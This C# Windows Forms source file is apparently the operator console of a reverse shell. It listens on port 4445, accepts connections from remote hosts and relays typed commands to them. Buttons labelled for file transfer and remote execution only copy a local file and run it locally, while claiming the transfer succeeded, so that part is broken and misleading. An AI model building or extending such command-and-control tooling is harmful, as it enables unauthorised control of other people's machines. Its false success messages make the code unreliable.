using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MyFirstClient
{
    public partial class Form1 : Form
    {
        TcpListener tcpListener;
        Socket socket;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        StringBuilder strinput;
        Thread th_StartListen, th_RunClient;
        Process process;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            th_StartListen = new Thread(new ThreadStart(StartListen));
            th_StartListen.Start();
            LblCo.Focus();
            TxtShell.Text = "Welcome To My Reverse Shell !\r\n";
        }

        private delegate void UpdateToolStripDelegate(string message);
        private void UpdateToolStrip(string message)
        {
            LblCo.Text = message;
        }
        private void StartListen()
        {
            tcpListener = new TcpListener(System.Net.IPAddress.Any, 4445);
            tcpListener.Start();

            if (LblCo.InvokeRequired)
            {
                LblCo.Invoke(new UpdateToolStripDelegate(UpdateToolStrip), "Listening on port 4445 ...");
            }
            else
            {
                LblCo.Text = "Listening on port 4445 ...";
            }

            for (; ; )
            {
                socket = tcpListener.AcceptSocket();
                IPEndPoint ipend = (IPEndPoint)socket.RemoteEndPoint;

                if (LblCo.InvokeRequired)
                {
                    LblCo.Invoke(new UpdateToolStripDelegate(UpdateToolStrip), "Connection from " + IPAddress.Parse(ipend.Address.ToString()));
                }
                else
                {
                    LblCo.Text = "Connection from " + IPAddress.Parse(ipend.Address.ToString());
                }

                th_RunClient = new Thread(new ThreadStart(RunClient));
                th_RunClient.Start();
            }
        }
        private delegate void DisplayDelegate(string message);
        private void DisplayMessage(string message)
        {
            if (TxtShell.InvokeRequired)
            {
                TxtShell.Invoke(new DisplayDelegate(DisplayMessage), message);
            }
            else
            {
                TxtShell.AppendText(message);
            }
        }

        private void RunClient()
        {
            networkStream = new NetworkStream(socket);
            streamReader = new StreamReader(networkStream);
            streamWriter = new StreamWriter(networkStream);
            strinput = new StringBuilder();

            while (true)
            {
                try
                {
                    strinput.Append(streamReader.ReadLine());
                    strinput.Append("\r\n");
                }
                catch (Exception)
                {
                    CleanUp();
                    break;
                }
                Application.DoEvents();
                DisplayMessage(strinput.ToString());
                strinput.Remove(0, strinput.Length);
            }
        }



        private void CleanUp()
        {
            try
            {
                streamReader.Close();
                streamWriter.Close();
                networkStream.Close();
                socket.Close();
                LblCo.Text = "Connection Lost";
            }
            catch(Exception)
            {  
            }
            
        }



        private void BtnUpload_Click(object sender, EventArgs e)
        {
            string[] files = Directory.GetFiles(".");
            string fileList = string.Join(",", files);
            streamWriter.WriteLine(fileList);
            streamWriter.Flush();
        }

        private void BtnDownExe_Click(object sender, EventArgs e)
        {
            string filename = "";
            string savePath = "";

            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Exe files (*.*)|*.*";

            if (ofd.ShowDialog() == DialogResult.OK)
            {
                filename = ofd.FileName;
                saveFileDialog1.Filter = "All files (*.*)|*.*";
                saveFileDialog1.FileName = Path.GetFileName(filename);

                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    savePath = saveFileDialog1.FileName;



                        // Écrire le contenu du fichier dans le flux de sortie
                        var buffer = new byte[4096];

                        savePath = saveFileDialog1.FileName;

                        byte[] fileBytes;
                        using (var fileStream = File.OpenRead(filename))
                        {
                            fileBytes = new byte[fileStream.Length];
                            fileStream.Read(fileBytes, 0, fileBytes.Length);
                        }

                        File.WriteAllBytes(savePath, fileBytes);

                        MessageBox.Show("Le transfert et l'execution du fichier a été effectué avec succès.");

                        ExecuteFile(savePath);
                    
                }
            }
        }
        
        private void BtnExit_Click(object sender, EventArgs e)
        {
            try
            {
                streamReader.Close();
                streamWriter.Close();
                networkStream.Close();
                socket.Close();
            }
            catch (Exception)
            {
            }
            Environment.Exit(0);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            CleanUp();

            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void TxtCommand_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {

                if (e.KeyCode == Keys.Enter)
                {

                    //-- (optional) suppresses ding sound

                    e.SuppressKeyPress = true;



                    strinput.Append(TxtCommand.Text.ToString());

                    streamWriter.WriteLine(strinput);

                    streamWriter.Flush();

                    strinput.Remove(0, strinput.Length);

                    if (TxtCommand.Text == "exit") CleanUp();

                    if (TxtCommand.Text == "terminate") CleanUp();

                    if (TxtCommand.Text == "cls") TxtShell.Text = "";

                    TxtCommand.Text = "";

                }

            }

            catch (Exception) { }
        }



        private void BtnDownload_Click(object sender, EventArgs e)
        {
            string filename = "";
            string savePath = "";

            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Exe files (*.*)|*.*";

            if (ofd.ShowDialog() == DialogResult.OK)
            {
                filename = ofd.FileName;
                saveFileDialog1.Filter = "All files (*.*)|*.*";
                saveFileDialog1.FileName = Path.GetFileName(filename);

                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    savePath = saveFileDialog1.FileName;



                    // Écrire le contenu du fichier dans le flux de sortie
                    var buffer = new byte[4096];

                    savePath = saveFileDialog1.FileName;

                    byte[] fileBytes;
                    using (var fileStream = File.OpenRead(filename))
                    {
                        fileBytes = new byte[fileStream.Length];
                        fileStream.Read(fileBytes, 0, fileBytes.Length);
                    }

                    File.WriteAllBytes(savePath, fileBytes);

                    MessageBox.Show("Le transfert du fichier a été effectué avec succès.");

                }
            }
        }

        private void ExecuteFile(string filePath)
        {
            process = new Process();
            process.StartInfo.FileName = filePath;
            process.Start();
        }


    }
}
